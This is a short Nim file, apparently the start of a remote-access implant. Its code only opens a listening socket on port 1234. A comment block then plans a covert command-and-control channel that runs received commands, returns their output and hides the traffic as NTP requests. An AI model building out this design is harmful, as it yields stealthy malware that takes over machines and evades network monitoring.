import net, os

proc cSock() = 
    var socket = newSocket()
    socket.bindAddr(Port(1234))
    socket.listen()
    var client: Socket
    var address = ""

    socket.acceptAddr(client, address)
    echo("Client connected from: ", address)



cSock()


#[raw sockets

recieve beacon, see ping/comd id
parse/decode bytes into readable
->run commmand
->get output
->encode output
->send output back to c2
->make it so NTP packet isn't actually read in
-> send actual NTP request for time

->see ping
->resync request
->receive actual time info from NTP server

]#
